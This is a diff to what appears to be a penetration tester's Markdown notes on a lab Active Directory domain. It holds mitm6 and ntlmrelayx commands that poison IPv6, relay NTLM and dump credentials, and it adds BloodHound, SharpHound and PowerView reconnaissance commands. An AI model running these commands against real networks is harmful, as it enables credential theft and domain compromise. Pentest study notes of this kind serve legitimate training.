@@ -2228,7 +2228,21 @@ https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
 ```
 sudo mitm6 -d marvel.local #Run mitm6 first to IPv6 server
 
-python3 /home/kali/.local/bin/ntlmrelayx.py -6 -t ldaps://192.168.68.122 -wh fakewpad.marvel.local -l lootme #Captures IPv6 request to capture & dump creds to lootme
+python3 /home/kali/.local/bin/ntlmrelayx.py -6 -t ldaps://192.168.68.122 -wh fakewpad.marvel.local -l lootme # Captures IPv6 request to capture & dump creds to lootme
+
+## AD Recon
+
+### PowerView
+https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993 # Cheat Sheet
+
+### Bloodhound
+
+AzureHound for Azure Active Directory # Install-Module -name Az -AllowClobber | Install-Module -name AzureADPreview -AllowClobber
+
+SharpHound for local Active Directory # run the collector on the machine using SharpHound
+
+"Invoke-BloodHound -CollectionMethod All  -Domain <DomainName> -ZipFileName <file.zip>" # copy zip over to attack machine to run in neo4j DB
+
 ```
 
 
